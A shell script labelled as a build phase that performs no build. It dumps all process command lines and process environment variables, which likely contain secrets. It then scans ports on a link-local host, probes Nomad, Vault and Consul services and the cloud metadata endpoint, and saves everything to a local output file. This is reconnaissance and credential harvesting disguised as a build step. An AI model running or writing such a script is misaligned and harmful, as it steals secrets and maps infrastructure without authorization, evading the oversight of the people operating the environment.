#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PHASE R38 ==="

echo "--- PIDS ---"
for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n); do
  cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 300)
  if [ -n "$cmdline" ]; then
    echo "PID=$pid CMD=$cmdline"
  fi
done

echo "--- PID ENVS ---"
for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n | head -50); do
  envdata=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' 2>/dev/null)
  if [ -n "$envdata" ]; then
    echo "=PID=$pid="
    echo "$envdata"
  fi
done

echo "--- MOUNTS ---"
cat /proc/self/mountinfo 2>/dev/null | head -40

echo "--- NETWORK ---"
ip addr 2>/dev/null | grep inet
ip route 2>/dev/null
cat /etc/resolv.conf 2>/dev/null

echo "--- PORT SCAN BRIDGE ---"
for port in 53 80 443 2379 4646 4647 4648 5432 8080 8200 8201 8300 8500 8600 9090 9200 12691 13133 15432 28319; do
  timeout 1 sh -c "echo >/dev/tcp/169.254.1.2/$port" 2>/dev/null && echo "OPEN:169.254.1.2:$port"
done
# Also try with nc since /dev/tcp might not work in Alpine sh
for port in 4646 4647 4648 8200 8300 8500 13133; do
  nc -zw1 169.254.1.2 $port 2>/dev/null && echo "NC-OPEN:169.254.1.2:$port"
done

echo "--- NOMAD ---"
N=https://169.254.1.2:4646
curl -sk --connect-timeout 2 $N/v1/agent/health 2>&1 | head -c 200
echo
curl -sk --connect-timeout 2 $N/v1/status/leader 2>&1 | head -c 200
echo
curl -sk --connect-timeout 2 $N/v1/metrics?format=prometheus 2>/dev/null | grep -o 'job="[^"]*"' | sort -u
echo

echo "--- DNS ---"
for name in vault consul falcon postgresql api nomad; do
  r=$(dig +short $name 2>/dev/null)
  [ -n "$r" ] && echo "DNS $name -> $r"
  r=$(dig +short $name.service.consul 2>/dev/null)
  [ -n "$r" ] && echo "DNS $name.sc -> $r"
done

echo "--- VAULT ---"
for ip in 169.254.1.2 127.0.0.1; do
  r=$(curl -sk --connect-timeout 2 https://$ip:8200/v1/sys/health 2>&1)
  [ -n "$r" ] && echo "vault $ip:8200: $r" | head -c 200
  echo
done

echo "--- METADATA ---"
curl -sk --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 300
echo
curl -sk --connect-timeout 2 http://169.254.1.1/ 2>&1 | head -c 300
echo

echo "=== BUILD DONE ==="
